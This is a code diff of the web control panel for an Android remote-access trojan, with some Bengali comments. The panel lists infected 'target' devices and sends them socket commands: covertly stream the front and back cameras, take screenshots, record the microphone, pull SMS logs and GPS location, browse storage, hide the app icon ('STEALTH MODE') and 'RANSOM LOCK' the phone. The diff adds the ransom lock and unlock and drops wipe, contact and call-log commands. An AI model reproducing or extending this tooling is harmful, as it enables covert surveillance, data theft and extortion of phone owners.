@@ -15,7 +15,7 @@
             display: flex; height: 100vh; overflow: hidden; padding: 25px; gap: 20px;
         }
 
-        /* 1/6 FLOATING SIDEBAR */
+        /* SIDEBAR */
         .sidebar { 
             flex: 0.8; min-width: 190px; background: var(--card); 
             border: 1px solid var(--accent); border-radius: 18px;
@@ -33,9 +33,10 @@
             border: 1px solid transparent; cursor: pointer; transition: 0.3s;
             background: rgba(255,255,255,0.03);
         }
+        .target-item:hover { border-color: var(--neon); }
         .target-item.active { background: var(--neon); color: #000; font-weight: bold; box-shadow: 0 0 20px var(--neon); }
 
-        /* 5/6 FLOATING MAIN PANEL */
+        /* MAIN PANEL */
         .main-panel { 
             flex: 4; background: var(--card); border-radius: 20px;
             border: 1px solid var(--accent); display: flex; 
@@ -62,7 +63,6 @@
 
         .content { flex: 1; padding: 25px; overflow-y: auto; }
 
-        /* FEATURE CARDS GRID */
         .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(135px, 1fr)); gap: 15px; }
         .card { 
             background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06);
@@ -72,7 +72,6 @@
         .card:hover { border-color: var(--neon); background: rgba(0, 242, 255, 0.12); transform: translateY(-4px); }
         .card span { display: block; font-family: 'Orbitron'; font-size: 9px; margin-top: 8px; color: #bbb; letter-spacing: 0.5px; }
 
-        /* MONITOR WINDOW */
         .monitor-window { 
             width: 100%; max-width: 320px; margin: 0 auto; aspect-ratio: 9/16;
             background: #000; border: 2px solid var(--neon); border-radius: 20px;
@@ -82,18 +81,15 @@
         #feed { width: 100%; height: 100%; object-fit: contain; }
         .monitor-label { position: absolute; top: 10px; left: 10px; font-size: 8px; font-family: 'Orbitron'; color: var(--neon); background: rgba(0,0,0,0.6); padding: 4px 8px; border-radius: 4px; }
 
-        /* LOG TERMINAL */
         .log-box { 
             background: rgba(0,0,0,0.6); border-radius: 12px; padding: 18px;
             height: 280px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 12px;
             color: #0f0; border: 1px solid var(--accent); border-left: 4px solid var(--neon);
         }
 
-        /* MOBILE OPTIMIZATION */
         @media (max-width: 768px) {
             body { flex-direction: column; padding: 12px; }
             .sidebar { flex: none; height: 130px; min-width: 100%; }
-            .main-panel { flex: 1; }
         }
     </style>
 </head>
@@ -127,68 +123,55 @@
                     <img id="feed" src="" alt="NO SIGNAL">
                 </div>
                 <div class="grid" style="margin-top: 25px;">
-                    <div class="card" onclick="cmd('START_CAM_STREAM', {camera: 'back'})" style="border-color: var(--neon);"><span>LIVE BACK CAM 📹</span></div>
-                    <div class="card" onclick="cmd('START_CAM_STREAM', {camera: 'front'})" style="border-color: var(--neon);"><span>LIVE FRONT CAM 📹</span></div>
-                    <div class="card" onclick="cmd('STOP_CAM_STREAM')" style="border-color: var(--danger);"><span>STOP STREAM ❌</span></div>
-                    
-                    <div class="card" onclick="cmd('START_MIRROR')"><span>SCREEN MIRROR</span></div>
+                    <div class="card" onclick="cmd('START_CAM', {camera: 'back'})"><span>LIVE BACK CAM 📹</span></div>
+                    <div class="card" onclick="cmd('START_CAM', {camera: 'front'})"><span>LIVE FRONT CAM 📹</span></div>
+                    <div class="card" onclick="cmd('STOP_CAM')"><span>STOP STREAM ❌</span></div>
                     <div class="card" onclick="cmd('GET_SCREENSHOT')"><span>SCREENSHOT</span></div>
-                    <div class="card" onclick="cmd('TAKE_PHOTO',{c:'back'})"><span>CAPTURE PHOTO Back</span></div>
-                    <div class="card" onclick="cmd('TAKE_PHOTO',{c:'front'})"><span>CAPTURE PHOTO Front</span></div>
-                    <div class="card" onclick="cmd('REC_AUDIO')"><span>MIC RECORD</span></div>
+                    <div class="card" onclick="cmd('REC_START')"><span>MIC RECORD START</span></div>
+                    <div class="card" onclick="cmd('REC_STOP')"><span>MIC RECORD STOP</span></div>
                     <div class="card" onclick="tts()"><span>TEXT TO SPEECH</span></div>
-                    <div class="card" onclick="cmd('VIBRATE')"><span>VIBRATE DEVICE</span></div>
                 </div>
             </div>
 
             <div id="data" class="tab-view" style="display: none;">
                 <div class="grid" style="margin-bottom: 20px;">
                     <div class="card" onclick="cmd('GET_SMS')"><span>SMS LOGS</span></div>
-                    <div class="card" onclick="cmd('GET_CALLS')"><span>CALL LOGS</span></div>
-                    <div class="card" onclick="cmd('GET_CONTACTS')"><span>CONTACT LIST</span></div>
                     <div class="card" onclick="cmd('GET_LOC')"><span>GPS LOCATION</span></div>
-                    <div class="card" onclick="cmd('GET_SIM')"><span>SIM INFO</span></div>
                 </div>
                 <div class="log-box" id="data-log">System initialization complete. Awaiting logs...</div>
             </div>
 
             <div id="storage" class="tab-view" style="display: none;">
-                <div class="grid" style="margin-bottom: 20px;">
-                    <div class="card" onclick="cmd('EXPLORE', {path:'/sdcard'})"><span>INTERNAL STORAGE</span></div>
-                    <div class="card" onclick="cmd('GET_DOWNLOADS')"><span>DOWNLOADS</span></div>
-                    <div class="card" onclick="cmd('GALLERY_SCAN')"><span>GALLERY ACCESS</span></div>
-                </div>
-                <div class="log-box" style="color: var(--neon); border-left-color: #fff;">
-                    <strong>Path:</strong> <span id="current-path">/sdcard</span><br><br>
-                    <div id="file-list">Browse storage to view files here...</div>
-                </div>
+                <div class="log-box" id="file-list">Browse storage to view files here...</div>
             </div>
 
             <div id="secure" class="tab-view" style="display: none;">
                 <div class="grid">
                     <div class="card" onclick="cmd('HIDE_ICON')"><span>STEALTH MODE</span></div>
-                    <div class="card" onclick="cmd('APP_LIST')"><span>INSTALLED APPS</span></div>
-                    <div class="card" onclick="cmd('WIPE')" style="border-color: var(--danger);"><span style="color: var(--danger);">FACTORY RESET</span></div>
-                    <div class="card" onclick="cmd('LOCK_DEVICE')" style="border-color: var(--danger);"><span style="color: var(--danger);">RANSOM LOCK</span></div>
+                    <div class="card" onclick="cmd('RANSOM_LOCK', {message: 'Your device is locked!'})"><span>RANSOM LOCK</span></div>
+                    <div class="card" onclick="cmd('RANSOM_UNLOCK')"><span>UNLOCK</span></div>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        const socket = io();
+        const socket = io(); // Render-এ অটোমেটিক কানেক্ট হবে
         let selected = null;
 
-        socket.on('update_list', (dev) => {
+        // অ্যাপ থেকে আসা ডিভাইস অনলাইন ইভেন্ট
+        socket.on('device_online', (dev) => {
             const list = document.getElementById('target-list');
             let el = document.getElementById('dev-' + dev.deviceId);
+            
             if(!el) {
                 el = document.createElement('div');
+                el.id = 'dev-' + dev.deviceId;
                 el.className = 'target-item';
                 el.onclick = () => {
                     selected = dev.deviceId;
                     document.getElementById('target-id').innerText = dev.info.model.toUpperCase();
-                    document.getElementById('bat-val').innerText = dev.info.battery + "%";
+                    document.getElementById('bat-val').innerText = (dev.info.battery || "--") + "%";
                     document.getElementById('status-dot').style.background = "#0f0";
                     document.querySelectorAll('.target-item').forEach(i => i.classList.remove('active'));
                     el.classList.add('active');
@@ -205,8 +188,9 @@
             evt.currentTarget.classList.add('active');
         }
 
+        // কমান্ড পাঠানোর ফাংশন (সার্ভার 'send_cmd' শোনে)
         function cmd(c, p = {}) {
-            if(!selected) return alert("CRITICAL: NO TARGET SELECTED!");
+            if(!selected) return alert("প্রথমে একটি ডিভাইস সিলেক্ট করুন!");
             socket.emit('send_cmd', { id: selected, cmd: c, payload: p });
             console.log("Sent Command:", c);
         }
@@ -216,16 +200,19 @@
             if(m) cmd('TTS', { message: m });
         }
 
+        // অ্যাপ থেকে আসা ডাটা (ইমেজ বা লগ) রিসিভ করা
         socket.on('new_incoming_data', (r) => {
-            // Updated logic to handle Screen, Screenshot, Photo AND Camera Stream
-            if(r.type === 'MIRROR' || r.type === 'PHOTO' || r.type === 'SCREENSHOT' || r.type === 'CAM_STREAM') {
+            if(r.type === 'PHOTO' || r.type === 'SCREENSHOT' || r.type === 'CAM_STREAM') {
                 document.getElementById('feed').src = 'data:image/jpeg;base64,' + r.data;
-                document.getElementById('stream-type').innerText = r.type + " LIVE";
+                document.getElementById('stream-type').innerText = r.type + " RECEIVED";
             } else {
                 const log = document.getElementById('data-log');
-                log.innerHTML = `<div>[${new Date().toLocaleTimeString()}] > ${r.type} received</div>` + log.innerHTML;
+                const entry = document.createElement('div');
+                entry.innerHTML = `[${new Date().toLocaleTimeString()}] <strong>${r.type}</strong>: ${JSON.stringify(r.data)}`;
+                log.prepend(entry);
             }
         });
     </script>
 </body>
-</html>
+    </html>
+
